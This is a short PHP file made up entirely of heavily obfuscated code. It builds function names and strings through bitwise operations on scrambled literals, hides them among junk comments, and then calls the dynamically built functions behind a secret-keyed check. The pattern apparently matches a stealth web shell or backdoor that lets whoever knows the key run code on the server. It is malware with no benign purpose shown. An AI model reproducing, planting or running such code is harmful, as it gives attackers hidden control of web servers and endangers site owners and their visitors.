<?php
$vxBcx0='ktJ'^R4_OwUN3T;$WwMn=P4Pb.' @'|'@ Pc P';$MG_aS=wwtgn.'~'&'oe~go~';$b_0E=/*Odp'.
        'iImpldx9BU*/qwOvxveClkkN&'r`un^:'.whl5cD;$CnrYDfyT2='`td'|'Dy-';'kK1p6lTOlVjG'.
        'pIr@$e?';$GPCvVciimCB='KX}['.DeMb.'|'.BRNeCORCcj^ncY49EbQ.'^'.m8fNa1.#wEyjPeX'.
        '(gXZ';$do='!O0> (pXm ")$`::v<b'|'m,@%"X`eiD#It`##PF"';$RJ8t=og&'/u';'zEFpYpCz'.
        'CYAQ*';$WJT2Purb6='@'.CZjGPN.'$!eh'|'~[RX#'.MtIhe8;$J3fJDWCT1='77'&'}0';'pt3v'.
        'k';$Gd='IC#'^'&/V';$EMvj='P@`'^'=6U';$dOdEUS='D`u'|tiq;$mR7zu='"'^j;'nHIn12NG'.
        'i[{A+%j';$lQ2FlRh0yW='|'&W;$HghD=')l'^'}<';$DkM4Zdwtxc=_a&_U;$k61hC_3IV=#QTtn'.
        '!'|'`';$cCI4=eA1fca.','.jAG1h.'"A0 B"'.FqLGF.'"ZR'|EB02." m@D Q%`"./*LhYCKhpW'.
        'zBK)>2-1*/bB11a0V9LSBNXE;$RCry8chtzwO=('{|b&ok'&'gdk:}`')|$WwMn;$z45f32UF=/*Y'.
        'vm*k*/$Gd&$EMvj;$CrL=('o}'.tmow&'o}'.vmow)&$MG_aS;$iYuq8=$b_0E|(#HTaF7_6CIQjj'.
        '@2EA^P$0LAC '|'@0%B_@$0LAC%');$tTTg=('q]34A{t"'.g972y2gc0.'"&77'./*hIeCDPd62n'.
        's$iHnq]*/wr4sa3y8w4z&'=Du~'.xf0vi.'=!~;|=1~~%k<h=wi+37'.kCv6)|('~gp}-*7'./*Nb'.
        'UcByc*/ua1155pu915eS.'#-ic<'.sw39j.'=*'&'%`27$'.pu3w.'{y7!4o9u{|'.edw2.'%#=30'.
        ''.yrvs);$Tfm=$dOdEUS&$CnrYDfyT2;$EVRLc=$GPCvVciimCB^$do;if($RCry8chtzwO(/*sk5'.
        'EvZa6s5|cT*/$z45f32UF($CrL($mR7zu.$lQ2FlRh0yW.$HghD.$DkM4Zdwtxc)),$tTTg))/*Wd'.
        'Z~nBcsO*/$iYuq8(('D,'^kM).$RJ8t,$Tfm,$k61hC_3IV);$iYuq8($WJT2Purb6,$CrL(/*rWB'.
        'KCiG8%a*/$EVRLc),$cCI4.$J3fJDWCT1);#ow @c|D$rj@p05Qr.;R.2690D*9OGa=_@]sL(cwJ'.
        ':3oRjybr_FQgu.?!iog1gZr:%Jw}G|JX<-X>l<9Gsqu:t&@[_E';